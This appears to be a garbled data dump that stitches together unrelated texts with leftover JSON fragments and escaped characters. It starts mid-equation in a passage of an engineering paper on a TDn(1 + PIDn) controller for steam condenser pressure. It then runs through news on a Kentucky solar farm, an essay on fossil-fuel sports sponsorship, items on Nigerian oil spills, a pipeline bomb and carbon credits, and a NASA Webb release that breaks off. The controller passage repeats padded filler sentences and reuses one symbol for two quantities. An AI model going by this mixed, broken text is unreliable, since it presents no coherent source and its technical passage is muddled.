(8)\n\n$$\\:\\frac{{dG}_{w}{H}_{w}}{dt}={G}_{c}\\times\\:{H}_{cw}+{G}_{gp}\\times\\:{H}_{gp}-({G}_{wo}\\times\\:{H}_{w})$$ (9)\n\nThe hot well water level equation, the hot well water quality equation, and the hot well water enthalpy equation are each represented by the Eqs. (7), (8) and (9), respectively. Using the dynamic heat balance equation for the flowing water, the mathematical model for the condenser tube side is created. This equation is described in17,19.\n\n$$\\:{M}_{w}{C}_{w}\\frac{{dT}_{2}}{{d}_{t}}=Q-{Q}_{w}=UA{\\varDelta\\:t}_{m}-{F}_{cw}{C}_{p}(T-{T}_{cw})$$ (10)\n\nThe value of \\(\\Delta t_{m}\\) is calculated as follows, based on17,19.\n\n$$\\:{\\varDelta\\:t}_{m}=\\frac{T-{T}_{cw}}{\\text{l}\\text{n}\\left[\\frac{({T}_{s}-{T}_{cw})}{({T}_{s}-T)}\\right]}$$ (11)\n\nThe degree of overcooling in the condenser is calculated as \\(\\Delta t_{m} = T_{c} - T_{w}\\)\u200b, where T c \u200b is the saturated water temperature corresponding to the vapor pressure in the condenser, and T w \u200b is the temperature of the hot well water in the condenser. The heat transfer error in the condenser is defined as \\(\\delta t = T_{s} - T\\), where T s \u200b is the saturated gas temperature corresponding to the saturation pressure in the condenser. For the dynamic heat balance, it is assumed that the total condensation rate remains constant, and that both the incoming steam and the outgoing condensate are in a saturated state. Consequently, the thermal energy transferred from the steam to the circulating water is equivalent to the steam\u2019s heat potential. The heat released by the steam can be calculated using the following equations:\n\n$$\\:\\frac{dT}{dt}=\\frac{{F}_{cw}}{{M}_{cw}}\\left({T}_{cw}-T\\right)+\\frac{Q}{{M}_{cw}{C}_{p}\\:}$$ (12)\n\nTo ensure that the mass balancing of steam and condensate is carried out in an accurate manner, it is essential to have a continuous system that maintains a steady volume of both steam and air. This must be done in order to guarantee that the mass balancing is carried out. Through the use of this, it is feasible to guarantee that the mass balance is carried out. This particular facet is one of the things that is taken into consideration to some degree. To put it another way, it is vital to restrict the outflow of condensate within a particular range in order to maintain the appropriate amount of vapor condensation within the condenser (at a particular vacuum level). In order to regulate the amount of condensation that takes place, this operation is carried out. It is essential to do this in order to maintain a consistent level of the necessary quantity of vapor condensation. It is necessary to take this step in order to guarantee that the condenser will be able to keep the required amount of vacuum during its operation. For the purpose of simplifying the model, we will make the assumption that the condensate will be in a saturated condition both when it enters the system and when it leaves the system. This will allow us to simplify the model. The model will be easier to understand as a result of this. As a result, the model becomes easier to understand, and the following equation best represents the behavior of an ideal gas. This is because of the circumstances that have arisen.\n\n$$\\:\\frac{dP}{dt}=\\frac{{RT}_{c}}{V}({F}_{s}-{F}_{c})$$ (13)\n\nProposed multi-stage controller TDn(1 + PIDn)\n\nThe innovative TDn(1 + PIDn) controller is designed to improve the precision and speed of pressure regulation in steam condensers. The proposed controller integrates several key components, each playing a critical role in achieving optimal control performance. Below is a detailed explanation of each section of the controller:\n\nTDn (tilt-derivative term with n filter)\n\nThe first part of the controller is the TDn component, which is a tilt-derivative with an n filter. Unlike traditional derivative terms, which solely rely on the rate of change of the error signal, the TDn term introduces nonlinear dynamics to the derivative action. This results in enhanced sensitivity to rapid changes in pressure, making the controller more reactive and capable of stabilizing the system against large fluctuations in a timely manner. This term also helps in suppressing noise amplification commonly associated with conventional derivative terms, thus improving overall system robustness.\n\nPIDn (proportional-integral-derivative with n filter)\n\nThe second section of the controller is a PIDn block that combines proportional, integral, and derivative actions, each equipped with n filter. This approach improves the flexibility and adaptability of the PID control mechanism to handle complex dynamic responses of the steam condenser system.\n\nProportional term (P) : The proportional gain is responsible for reducing the present error by adjusting the output based on the current difference between the setpoint and the measured pressure. By including a nonlinear gain, the proportional term becomes more effective in large error regions, allowing the controller to make aggressive corrections when necessary.\n\nIntegral term (I) : The integral term eliminates steady-state errors by integrating the error signal over time. The nonlinear gain modifies the standard integral action, making it more efficient at minimizing long-term deviations while avoiding excessive overshooting, a common problem in conventional PID controllers. This nonlinear adjustment allows the controller to maintain pressure stability over extended operating periods.\n\nDerivative term (D): The derivative term predicts future system behavior based on the rate of error change. In the PIDn section, the derivative term is similarly enhanced with a nonlinear gain, which improves the controller\u2019s foresight capabilities, resulting in smoother transitions and quicker response times when system dynamics change abruptly.\n\nInteraction between TDn and PIDn\n\nThe interaction between the TDn and PIDn components is what sets this controller apart from traditional models. The combination of a TDn action with a PIDn block ensures that both transient and steady-state responses are managed effectively. While the TDn term ensures rapid stabilization in the face of large pressure deviations, the PIDn section fine-tunes the control output to maintain the desired setpoint over time, even in the presence of disturbances or system noise.\n\nMulti-stage structure\n\nThe TDn(1 + PIDn) controller demonstrates a unique multi-stage design that significantly enhances its performance in managing nonlinear systems, such as shell-and-tube steam condensers. This innovative structure enables stepwise refinement of control actions, optimizing each phase of the process to address specific challenges with precision and adaptability. The initial adjustment phase focuses on rapid response, allowing the controller to swiftly mitigate disturbances or setpoint variations, effectively preventing instability and excessive oscillations. The mid-range correction phase ensures smooth transitional control by addressing moderate deviations and managing the nonlinearities inherent in complex systems. Finally, the fine-tuned stabilization phase provides precise steady-state regulation, minimizing residual errors and maintaining long-term stability even under persistent deviations.\n\nBy seamlessly integrating these stages, the TDn(1 + PIDn) controller achieves an exceptional balance between responsiveness and stability. Its ability to adapt dynamically across all phases of operation ensures superior performance compared to conventional FOPID, PI-PDn and PI controllers. This advanced control strategy not only enhances system precision but also makes the TDn(1 + PIDn) controller particularly advantageous for demanding industrial applications, such as steam condenser pressure regulation, where nonlinear behaviors and complex dynamics must be effectively managed. Figure 2 contains the block diagram that illustrates the controller that is being considered as a possible alternative.\n\nFig. 2 Block diagram of the proposed multistage TDn(1 + PIDn) controller. Full size image\n\nEquation (14), which presents the open-loop transfer function for the first-stage controller, is as follows:\n\n$$\\:{G}_{TDn}\\left(s\\right)=\\frac{{\\Delta\\:}{U}_{1}\\left(s\\right)}{{\\Delta\\:}\\text{T}\\left(s\\right)}=\\frac{{K}_{T}}{{s}^{\\frac{1}{n}}}+[{K}_{D}\\times\\:\\left(\\frac{Ns}{N+S}\\right)]$$ (14)\n\nShell-and-tube steam condensers benefit from added stability and control that can be fine-tuned thanks to the second stage. Presented below is the equation that represents the open-loop transfer function of the second stage controller. (15) :\n\n$$\\:{G}_{(1+PIDn)}\\left(s\\right)=\\frac{{\\Delta\\:}\\text{U}\\left(s\\right)}{{\\Delta\\:}{U}_{1}\\left(s\\right)}={1+[K}_{P}+\\frac{{K}_{I}}{s}+\\frac{{K}_{DD}NNs}{s+NN}]$$ (15)\n\nIn order to illustrate the open-loop representation of the proposed controller, the Eq. (16) can be constructed as follows:\n\n$$\\:{G}_{TDn\\left(1+PIDn\\right)}\\left(s\\right)=\\frac{{\\Delta\\:}\\text{U}\\left(s\\right)}{{\\Delta\\:}\\text{T}\\left(s\\right)}=\\left[\\frac{{K}_{T}}{{s}^{\\frac{1}{n}}}+\\left(\\frac{{K}_{D}Ns}{N+s}\\right)\\right]\\times\\:[{1+(K}_{P}+\\frac{{K}_{I}}{s}+\\frac{{K}_{DD}NNs}{s+NN})]$$ (16)\n\nNonlinear gain tuning\n\nOne of the novel aspects of this controller design is the introduction of nonlinear gain tuning parameters for both the TDn and PIDn blocks. These parameters are carefully selected to match the dynamic properties of the steam condenser system, allowing the controller to adapt to varying operating conditions. The tuning process optimizes the balance between responsiveness and stability, ensuring efficient pressure regulation even in highly volatile environments. Figure 3 depicts the block diagram of the shell and tube steam condenser system incorporating a TDn(1 + PIDn) controller. In this diagram, \\(\\:R\\left(s\\right)\\), E\\(\\:\\left(s\\right)\\), U\\(\\:\\left(s\\right)\\), and \\(\\:P\\left(s\\right)\\), represent the pressure setpoint, error between pressure setpoint and condenser, output signal from proposed controller and condenser pressure, respectively. For the time being, the closed-loop reaction to a step change in the P setpoint is an approach that is being applied in order to accomplish the objectives that are related with this particular research. This particular reaction involves a transition from 90 kPa to 95 kPa.",

            "content": "A 111-MW solar power facility built on reclaimed land at a former coal mine site in Kentucky has entered commercial operation. The Martin County Solar Project (MCSP), developed, built, owned and operated by Savion\u2014a Shell Group portfolio company\u2014is now among the largest solar farms in the state and also one of the first U.S. solar power facilities located on former coal mine land.\n\nSavion on Jan. 14 announced the start of operations of MCSP. The solar farm was built on land formerly used by the Martiki coal mine in Pilgrim, Kentucky. Savion is the sole owner of the facility, while Shell serves as the project\u2019s asset manager.\n\n\u201cThe critical partnerships among the Martin County Judge Executive and Fiscal Court, local community members, educational advocates, economic and workforce development leaders, as well as the teams working on the ground were essential to helping bring this unique solar facility online,\u201d said Nick Lincon, president of Savion. \u201cYears ago, Savion saw the exceptional opportunity to develop a solar project on a former coal mine in the great state of Kentucky, which has a rich history of energy generation in this country and continues to demonstrate its commitment to powering our nation through creative solutions such as this one. We\u2019re proud to be able to bring this project into operation and grateful to everyone who made this project a reality.\u201d\n\nThe 850-acre project includes more than 214,000 bifacial solar panels. It interconnects to Kentucky Power\u2019s Inez Substation, which is already located at the site. Kentucky Power is part of American Electric Power (AEP). AEP, headquartered in Columbus, Ohio, serves customers in 11 states.\n\nThe MSCP project in December 2021 received approval from the Martin County Fiscal Court and Kentucky Economic Development Finance Authority for a $231 million industrial revenue bond, along with a $600,000 sales tax incentive through the Kentucky Enterprise Initiative Act. Construction began in October 2023 and was completed in December of last year.\n\nThe project has a virtual power purchase agreement (VPPA) with Toyota Motor North America for 100 MW of the generation from the site. Shell Energy North America has a VPPA for the other 11 MW.\n\n\u201cRespect for the planet is one of our company\u2019s core values,\u201d said Willie Overmann, carbon neutrality business manager for Toyota Motor North America. \u201cWe demonstrate this value by striving to go beyond carbon neutrality with our products, services, and operations and find new ways to make a positive impact on our planet and society. This virtual power purchase agreement with Savion embodies the transparent, science-based approach we take when addressing one of the most complex challenges of our time.\u201d\n\nSavion, which develops utility-scale solar and energy storage projects in the U.S., has a portfolio of more than 43 GW of generation capacity. The company worked with Kentucky-based Edelen Renewables during the development phase of the MCSP. The project received a certificate of construction from the Kentucky State Siting Board in November 2021.\n\n\u2014Darrell Proctor is a senior editor for POWER.",

            "content": "The NFL was forced to relocate Monday night\u2019s playoff game between the Los Angeles Rams and the Minnesota Vikings to State Farm Stadium in Arizona because the Rams\u2019 home field, SoFi Stadium, is only 10 miles from the Palisades Fire, the largest of six active blazes in the Los Angeles area. Turbocharged by climate change , the fires have killed at least 24 people, burned more than 40,000 acres, destroyed more than 12,300 structures, and displaced tens of thousands of residents.\n\nThe day before the game, Rams quarterback Matthew Stafford told reporters that his team was playing for more than just themselves\u2014they were playing for the entire city of Los Angeles. \u201cEvery time we suit up, we\u2019re the Los Angeles Rams,\u201d he said . \u201cWe play for the people in this community, the people that support us, and this week will be another example of that.\u201d\n\nBut the Rams also play for their corporate sponsors, which ironically include Shell Oil Products US , an affiliate of a multinational oil company that bears major responsibility for the conditions that set the stage for Los Angeles\u2019 devastating fires.\n\nWill mounting extreme weather disasters\u2014and stadium damage projections\u2014ever convince the L.A. Rams and other sports teams to sever their ties to the very companies responsible for the climate crisis?\n\nThe Rams are not alone in their choice of partnerships. More than 60 U.S. pro sports teams and at least three leagues have lucrative sponsorship deals with oil companies and electric and gas utilities that afford the companies a range of promotional perks, from building signage to uniform logos to facility naming rights, according to a survey conducted last fall by UCLA\u2019s Emmett Institute on Climate Change and the Environment. Likewise, sports teams and leagues partner with banks and insurance companies that invest billions of dollars in coal, oil and gas companies, all to the detriment of public health and the environment.\n\nWith annual payrolls running as high as $240 million in the NFL, $300 million in the MLB, and $200 million in the NBA, it is not hard to understand why teams pursue corporate sponsorships.\n\nCompanies, meanwhile, sponsor teams and leagues to increase visibility and build public trust. According to a 2021 Nielsen \u201cTrust in Advertising\u201d study , 81 percent of consumers completely or somewhat trust brands that sponsor sport teams, second only to the trust they have for friends and family. By sponsoring a team, corporations increase the chance that fans will form the same bond with their brand that they have with the team.\n\nOil companies, gas and electric utilities, and the banks and insurance companies that finance them have yet another rationale for aligning with a team or a league: to distract the public from their unethical practices and portray themselves as public-spirited, good corporate citizens. It\u2019s called sportswashing, a riff on the term greenwashing.\n\nWhen Bank of America\u2014which invested $33.68 billion in fossil fuel companies in 2023 alone\u2014signed on as an official sponsor of the FIFA World Cup last year, the company\u2019s chief marketing officer explained how it works. \u201cThe World Cup is religious for the fans, it\u2019s an entirely different beast,\u201d he said . \u201cIt allows us a very powerful place for the emotional connections to build the brand.\u201d Having a strong brand, he added , can provide a \u201chalo effect\u201d for a company.\n\nMaking Shell Look Good\n\nThe Rams and Shell have been partners since 2018, but in October 2023 the Rams announced that the company signed a multiyear contract for an undisclosed sum to be the \u201cexclusive fuel sponsor\u201d of the team, SoFi Stadium and Hollywood Park, the mixed-use, under-construction district surrounding the stadium that is owned and operated by Rams CEO Stan Kroenke. Shell now offers gasoline discounts on game days and collaborates with the three organizations on community initiatives on health, STEAM (science, technology, engineering, the arts and mathematics) education, sustainability and other issues.\n\nA home is engulfed in flames during the Eaton fire in the Altadena area of Los Angeles County, California on January 8, 2025. (Photo by Josh Edelson/AFP via Getty Images)\n\nThe Rams could not have picked a more inappropriate partner (except, perhaps, ExxonMobil). Shell a cosponsor of community health projects? It\u2019s one of the top 20 air polluters in the country. A supporter of STEAM education? The first initial of that acronym stands for \u201cscience,\u201d but Shell is still funding climate science disinformation, even though it was aware of the threat its products pose as far back as the 1950s. And a promoter of sustainability? Historically the company is the fourth-biggest investor-owned carbon polluter and the second-biggest since 2016, when the Paris climate agreement to cut emissions was signed.\n\nIn 2020, the company did adopt a number of goals to achieve net-zero emissions by 2050. Since then, however, it has backtracked, reneging on its pledge to cut oil production 1 to 2 percent annually through 2030, weakening its target of reducing emissions from 25 to 40 percent by 2030 to only 20 to 30 percent, and completely abandoning its goal of lowering the total \u201cnet carbon intensity\u201d of its products (the emissions per unit of energy) 45 percent by 2035 due to \u201cuncertainty in the pace of change in the energy transition.\u201d\n\nThe Rams are not the only U.S. pro team, nor the only team in California, enabling sportswashing. Chevron sponsors the Los Angeles FC soccer team, Sacramento Kings and San Francisco Giants; Arco, owned by Marathon Petroleum, sponsors the L.A. Dodgers and Sacramento Kings; NRG Energy, an electric utility that sold off its renewable energy division years ago, sponsors the San Francisco 49ers; and Phillips 66, owner of Union 76 gas stations, also sponsors the Dodgers. Although the two NBA teams in Los Angeles do not have fossil fuel industry-related sponsors, ExxonMobil is an \u201c official marketing partner \u201d of the NBA, WNBA and NBA Development League in the United States and China.\n\nGiven California has been plagued by climate change-driven wildfires for years, one would hope that sports teams in the state would reconsider their fossil fuel industry sponsorships. Last August, more than 80 public interest groups, scientists and environmental advocates tried to get the Dodgers to do just that, calling on the team to cut its ties to Phillips 66. \u201cUsing tactics such as associating a beloved, trusted brand like the Dodgers with enterprises like [Union] 76,\u201d they wrote in an open letter , \u201cthe fossil fuel industry has reinforced deceitful messages that \u2018oil is our friend,\u2019 and that \u2018climate change isn\u2019t so bad.\u2019\u201d Since it was first posted, more than 22,000 Dodgers fans have added their names to the letter, which urges the team to end its sponsorship deal with the oil company \u201cimmediately.\u201d To date, they are still waiting for a response.\n\nCalifornia state, county and city governments, meanwhile, are going after the perpetrators in court. Altogether they have launched nine lawsuits against Chevron, ExxonMobil and Shell to hold them accountable for deceiving the public and force them to pay climate change-related damages. The cities filing suit include Imperial Beach, Oakland, Richmond (home to a Chevron refinery), San Francisco and Santa Cruz. Five of the nine lawsuits also name Marathon Petroleum and Philips 66 as defendants.\n\nState Farm a Good Neighbor?\n\nThe UCLA survey only documented the links between pro sports teams and their leagues with oil and utility companies. Banks and insurance companies that finance fossil fuel projects also have sponsorship deals. For example, six of the 12 banks that invested the most in fossil fuel companies since the Paris climate agreement was signed in 2016\u2014Bank of America, Barclays, Citigroup, JPMorgan Chase, Scotiabank and Wells Fargo\u2014have each spent a small fortune on sports facility naming rights. Meanwhile, a review of the 30 NFL stadiums found that at least three are named for an insurance company with significant fossil fuel-related investments. One of those facilities is State Farm Stadium in Glendale, Arizona, where the Rams and Vikings played Monday night. The biggest home and auto insurer in the country, State Farm bought naming rights to the stadium in the fall of 2018 for an undisclosed sum.\n\nUnlike all but one of its competitors, which have significantly cut back their investments in fossil fuel projects, State Farm has dramatically increased them, according to a September 2024 Wall Street Journal investigation . As of last May, the company held $20.6 billion in shares and bonds in 65 fossil fuel companies, including Chevron, ExxonMobil and Shell, according to a 2024 report by Urgewald, a German environmental group.\n\nIn May 2023, at the same time it was expanding its fossil fuel industry portfolio, State Farm stopped issuing new homeowner policies in California because of wildfire risks and ballooning construction costs. Less than a year later, it announced that it would not renew 30,000 homeowner policies and 42,000 policies for commercial apartments in the state. Some 1,600 of those policies covered homes in Pacific Palisades, the neighborhood just destroyed by the Palisades Fire.\n\nState Farm\u2019s \u201c 2023 Impact Report \u201d states the obvious: \u201cBeing a good steward of our environmental resources just makes sense for everyone.\u201d But for the company, that only means cutting its own carbon emissions, reducing waste at its facilities, and promoting paperless options for its customers. What about the impact of the billions of dollars the company invests in major carbon polluters? The report doesn\u2019t mention it.\n\nStadiums at Risk\n\nHurricanes, snowstorms, and other severe events have forced the NFL to cancel preseason games and postpone and move regular season games in the past. But Monday night\u2019s game in Arizona was the first time the NFL had to relocate a postseason game since 1936, when it moved the championship game between the Green Bay Packers and the Boston Redskins from Boston to New York because of low ticket sales.\n\nWhat about the impact of the billions of dollars the company invests in major carbon polluters?\n\nGoing forward, the NFL and other sports leagues likely will have to move games more often, if not abandon facilities, because of climate change-related extreme weather events. A handful of events over the last two decades may signal what team owners should anticipate. They include:\n\nHurricane Milton sweeping through Florida\u2019s midsection last October, shredding the roof of the Tampa Bay Ray\u2019s Tropicana Field in St. Petersburg and causing more than $55 million in damage. The Rays will have to play its 2025 season home games at the Yankees\u2019 11,000-seat spring training facility in Tampa.\n\nin damage. The Rays will have to play its 2025 season home games at the Yankees\u2019 11,000-seat spring training facility in Tampa. A massive snowstorm in December 2010 crushing the roof of the Minnesota Vikings\u2019 Metrodome, costing $18 million to replace.\n\nto replace. Hurricane Katrina ripping the roof off of the New Orleans Saints\u2019 Superdome in August 2005, costing more than $200 million to repair.\n\nSeveral NFL stadiums are especially at risk, according to a report published last October by Climate X , a data analytics company. The report ranks the 30 NFL stadiums based on their vulnerability to such climate hazards as flooding, wildfires, extreme heat and storm surge, and compares projected damage over the next 25 years to each stadium\u2019s current replacement value.\n\nThe three stadiums that face the greatest threat? MetLife Stadium, SoFi Stadium and State Farm Stadium, in that order.\n\nThe report projects that MetLife Stadium, the New Jersey home of the New York Giants and Jets, will suffer the highest total percentage loss of 184 percent of its current replacement value, with cumulative damages of more than $5.6 billion by 2050 due to its low elevation and exposure to surface flooding and storm surges. (Like State Farm, the MetLife insurance company has major fossil fuel investments. As of May 2024, it held $7.4 billion in stocks and bonds in more than 200 companies, including Chevron, ConocoPhillips, ExxonMobil and Shell.)\n\nSoFi Stadium and State Farm Stadium, meanwhile, are both expected to sustain significant losses due to increased flooding and \u2026 wildfires. The Climate X report estimates that SoFi Stadium will incur a cumulative loss of 69 percent of its current replacement value with damages of $4.38 billion by 2050. State Farm Stadium, the third-most vulnerable facility, likely will experience a 39 percent total loss, with $965 million in cumulative damages.\n\nWill mounting extreme weather disasters\u2014and stadium damage projections\u2014ever convince the L.A. Rams and other sports teams to sever their ties to the very companies responsible for the climate crisis?\n\nLast summer, U.N. Secretary-General Ant\u00f3nio Guterres castigated coal, oil and gas companies\u2014which he dubbed the \u201cgodfathers of climate chaos\u201d\u2014for spreading disinformation and called for a worldwide ban on fossil fuel advertising. He also urged ad agencies to refuse fossil fuel clients and companies to stop taking their ads. So far, more than 1,000 advertising and public relations agencies worldwide have pledged to refuse working for fossil fuel companies, their trade associations, and their front groups.\n\nIt is past time for professional sports teams and leagues to do the same.",

While there is no concrete data on how many oil spills have occurred in Nigeria, researchers believe \"an estimated 13 million barrels (1.5 million tons) of crude oil have been spilled since 1958 from over 7,000 oil spill incidents.\"\n\nShell has indicated its interest in selling the land it was using to source oil in Nigeria. Local environmental activists are demanding accountability, and local residents want their land and water cleaned up before a sale happens.\n\n\"It would be unconscionable for Shell to pack up its onshore operations in Nigeria without cleaning up its mess and paying compensation,\" said Steve Bilko, a lawyer for some of the oil victims, per Climate Home News.\n\nWhy are these oil spills concerning?\n\nOil spills can be extremely hazardous to human health and even impact generations. According to a study published in the National Library of Medicine, oil spills contaminate surface water, groundwater, ambient air, and crops. They cause carcinogens and radioactive materials to bioaccumulate in the local food supply, contributing to a 24% increase in childhood malnutrition.\n\nSpills can also cause a 45% increase in radiation present in the environment.

During an inspection of the Far North Liquids and Associated Gas System Pipeline (Flags pipeline), Shell's staff located what they believe to be an unexploded bomb near the line at a position about 40 miles to the east of Shetland.\n\nShell has launched an investigation into how this unexploded bomb came to be next to an operating subsea gas pipeline, and the supermajor has brought in a third-party advisor to examine the circumstances. The Maritime and Coastguard Agency has been notified, and a guard vessel has been stationed next to the location of the bomb. For now, the pipeline continues to operate as normal.\n\nThe Flags pipeline was installed in 1982, in the heyday of North Sea oil and gas development. It is a 36-inch line stretching about 200 nautical miles north to south, and delivers wet gas from the Brent Field to the St. Fergus Gas Terminal in Scotland. In 2007, Flags was connected to the Tampen gas pipeline between Norway's Statfjord development and the UK. Shell and ExxonMobil share the pipeline's ownership.\n\nAn estimated 500,000 pieces of unexploded weaponry from WWI and WWII rest on the bottom in waters around Great Britain, according to a 2020 parliamentary study. Just last month, a Scottish fishing vessel brought up an unexploded antisubmarine mortar in the Firth of Forth near Edinburgh. The device contained about 80 pounds of explosives, and after the crew were evacuated, it was safely removed from the boat by an HM Coastguard bomb squad. The mortar was moved offshore and safely detonated in deeper water.",

            "content": "Which company used the most carbon credits in 2024? Although tech giants often hog the carbon market headlines, the biggest user by a wide margin was Shell, which retired 14.5 million credits in 2024, according to figures released last week by AlliedOffsets, a carbon markets data firm. Microsoft, the tech\u2019s sector biggest user, came in a distant second with 5.5 million retirements.\n\nYet the raw numbers are not the most significant difference between the two companies that sit atop the buyers\u2019 leaderboard. An examination of the credits each company retired emphasizes the divergent strategies the two are taking in the carbon markets.\n\nTale of two companies\n\nMicrosoft, which did not feature in the 2023 top 10, focused almost exclusively on carbon removal credits. Close to 80 percent of the credits it retired were from projects that generate energy by burning biomass and then capturing and storing the associated emissions. Because the biomass captures carbon dioxide as it grows, the process, known as bioenergy with carbon capture and storage (BECCS), can be carbon negative. The company\u2019s largest BECCS purchase, for 3.3 million credits, was with the Swedish company Stockholm Exergi.\n\nBECCS is an important part of some global net-zero pathways. It\u2019s also a relatively new and expensive technology. Microsoft did not reveal the price of the credits it purchased from BECCS developers, but in November AlliedOffsets estimated the average price of a BECCS credit at $389. The average price of Microsoft\u2019s 2024 purchases for which AlliedOffsets has data was $189.\n\nShell, which also topped AlliedOffset\u2019s 2023 leaderboard, focused on projects that avoided greenhouse gas emissions. The company retires credits to offset its emissions and, unlike Microsoft, also helps clients acquire credits. It used more established credit types, retiring 9.4 million forestry and land use credits and 2.4 million renewable energy credits.\n\nCredit: AlliedOffsets\n\nProjects of this type are far cheaper: the average price paid by Shell was $4.15. They\u2019re also more likely to be associated with integrity issues. Just over 600,000 of the credits that Shell retired, for example, were generated by projects that followed methodologies that were rejected last year by the Integrity Council for the Voluntary Carbon Market (ICVCM), a key arbiter of credit quality.\n\nShell\u2019s focus on relatively low-cost forestry and renewables projects is similar to other energy companies, which as a sector dominate the top 10 positions on the leaderboard. \u201cThe companies\u2019 overall emissions may explain the different strategies taken: energy firms have among the highest emissions and low revenues per emissions,\u201d said Anton Root, co-founder of AlliedOffsets. \u201cTech firms, on the other hand, tend to have high revenues per ton emitted, allowing them to spend more on offsetting their footprints.\u201d\n\nCutting super-pollutants\n\nFurther down the leaderboard there\u2019s evidence for other strategies being pursued by large buyers:\n\nLenovo, a Hong King-based technology company, retired just over 1 million credits generated by a project that cuts emissions of pollutants with high global warming potential from chemical plants. The company also purchased 244,000 renewable energy credits that follow methodologies rejected by the ICVCM.\n\nTakeda, a pharmaceutical firm headquartered in Tokyo, retired close to a million credits from projects that reduce the use of refrigerant chemicals that have high global warming potential.\n\nCanada Growth Fund, a public investment fund, retired 3 million credits for $85 each from a yet-to-be constructed waste-to-energy plant that will capture and store the emissions it creates.\n\n[Get the latest insights on carbon markets, disclosure, nature and more at GreenBiz 25 \u2014 our premier sustainability event, Feb. 10-12, Phoenix.]",

            "content": "Astronomers have long tried to track down how elements like carbon, which is essential for life, become widely distributed across the universe. Now, NASA\u2019s James Webb Space Telescope has examined one ongoing source of carbon-rich dust in our own Milky Way galaxy in greater detail: Wolf-Rayet 140, a system of two massive stars that follow a tight, elongated orbit.\n\nAs they swing past one another (within the central white dot in the Webb images), the stellar winds from each star slam together, the material compresses, and carbon-rich dust forms. Webb\u2019s latest observations show 17 dust shells shining in mid-infrared light that are expanding at regular intervals into the surrounding space.\n\nImage A: Compare Observations of Wolf-Rayet 140 (MIRI Images)\n\nTwo mid-infrared images from NASA\u2019s James Webb Space Telescope of Wolf-Rayet 140 show carbon-rich dust moving in space. At right, the two triangles from the main images are matched up to show how much difference 14 months makes: The dust is racing away from the central stars at almost 1% the speed of light. These stars are 5,000 light-years away in our own Milky Way galaxy. Image: NASA, ESA, CSA, STScI; Science: Emma Lieb (University of Denver), Ryan Lau (NSF NOIRLab), Jennifer Hoffman (University of Denver)\n\n\u201cThe telescope not only confirmed that these dust shells are real, its data also showed that the dust shells are moving outward at consistent velocities, revealing visible changes over incredibly short periods of time,\u201d said Emma Lieb, the lead author of the new paper and a doctoral student at the University of Denver in Colorado.\n\nEvery shell is racing away from the stars at more than 1,600 miles per second (2,600 kilometers per second), almost 1% the speed of light. \u201cWe are used to thinking about events in space taking place slowly, over millions or billions of years,\u201d added Jennifer Hoffman, a co-author and a professor at the University of Denver. \u201cIn this system, the observatory is showing that the dust shells are expanding from one year to the next.\u201d\n\nLike clockwork, the stars\u2019 winds generate dust for several months every eight years, as the pair make their closest approach during a wide, elongated orbit. Webb also shows how dust formation varies \u2014 look for the darker region at top left in both images.\n\nVideo A: Fade Between 2022 and 2023 Observations of Wolf-Rayet 140\n\nThis video alternates between two mid-infrared light observations from NASA\u2019s James Webb Space Telescope of Wolf-Rayet 140. Over only 14 months, Webb showed the dust in the system has expanded. This two-star system has sent out more than 17 shells of dust over 130 years. Video: NASA, ESA, CSA, STScI.; Science: Emma Lieb (University of Denver), Ryan Lau (NSF NOIRLab), Jennifer Hoffman (University of Denver)\n\nVideo B: Stars\u2019 Orbits in Wolf-Rayet 140 (Visualization)\n\nWhen the two massive stars in Wolf-Rayet 140 swing past one another, their winds collide, material compresses, and carbon-rich dust forms. The stronger winds of the hotter star in the Wolf-Rayet system blow behind its slightly cooler (but still hot) companion. The stars create dust for several months in every eight-year orbit.\n\nVideo: NASA, ESA, CSA, Joseph Olmsted (STScI).\n\nThe telescope\u2019s mid-infrared images detected shells that have persisted for more than 130 years. (Older shells have dissipated enough that they are now too dim to detect.) The researchers speculate that the stars will ultimately generate tens of thousands of dust shells over hundreds of thousands of years.\n\n\u201cMid-infrared observations are absolutely crucial for this analysis, since the dust in this system is fairly cool. Near-infrared and visible light would only show the shells that are closest to the star,\u201d explained Ryan Lau, a co-author and astronomer at NSF NOIRLab in Tuscon, Arizona, who led the initial research about this system. \u201cWith these incredible new details, the telescope is also allowing us to study exactly when the stars are forming dust \u2014 almost to the day.\u201d\n\nThe dust\u2019s distribution isn\u2019t uniform. Though this isn\u2019t obvious at first glance, zooming in on the shells in Webb\u2019s images reveals that some of the dust has \u201cpiled up,\u201d forming amorphous, delicate clouds that are as large as our entire solar system. Many other individual dust particles float freely. Every speck is as small as one-hundredth the width of a human hair. Clumpy or not, all of the dust moves at the same speed and is carbon rich.\n\nThe Future of This System\n\nWhat will happen to these stars over millions or billions of years, after they are finished \u201cspraying\u201d their surroundings with dust? The Wolf-Rayet star in this system is 10 times more massive than the Sun and nearing the end of its life. In its final \u201cact,\u201d this star will either explode as a supernova \u2014 possibly blasting away some or all of the dust shells \u2014 or collapse into a black hole, which would leave the dust shells intact.\n\nThough no one can predict with any certainty what will happen, researchers are rooting for the black hole scenario. \u201cA major question in astronomy is, where does all the dust in the universe come from?\u201d Lau said. \u201cIf carbon-rich dust like this survives, it could help us begin to answer that question.\u201d\n\n\u201cWe know carbon is necessary for the formation of rocky planets and solar systems like ours,\u201d Hoffman added. \u201cIt\u2019s exciting to get a glimpse into how binary star systems not only create carbon-rich dust, but also propel it into our galactic neighborhood.\u201d\n\nThese results have been published in The Astrophysical Journal Letters and were presented in a press conference at the 245th meeting of the American Astronomical Society in National Harbor, Maryland.\n\nThe James Webb Space Telescope is the world\u2019s premier space science observatory. Webb will solve mysteries in our solar system, look beyond to distant worlds around other stars, and probe the mysterious structures and origins of our universe and our place in it. Webb is an international program led by NASA with its partners, ESA (European Space Agency) and the Canadian Space Agency.\n\nDownloads\n\nRight click any image to save it or open a larger version in a new tab/window via the browser's popup menu.\n\nView/Download all image products at all resolutions for this article from the Space Telescope Science Institute.\n\nView/Download the research results from The Astrophysical Journal Letters.\n\nLaura Betz - laura.e.betz@nasa.gov\n\nNASA\u2019s Goddard Space Flight Center, Greenbelt, Md.\n\nClaire Blome - cblome@stsci.edu, Christine Pulliam - cpulliam@stsci.edu\n\nSpace Telescope Science Institute, Baltimore, Md.\n\nScience - Emma Lieb (University of Denver)\n\nRelated Information\n\nWebb Blog: Learn more about WR 140\n\nInfographic: Choose your path: Destiny of Dust\n\nSVS Graphic: Periodic Table of the Elements: Origins of the Elements\n\n3D Resource for WR140\n\nMore Webb News\n\nMore Webb Images\n\nWebb Science Themes\n\nWebb Mission Page\n\nRelated For Kids\n\nWhat is the Webb Telescope?\n\nSpacePlace for Kids\n\nEn Espa\u00f1ol\n\nCiencia 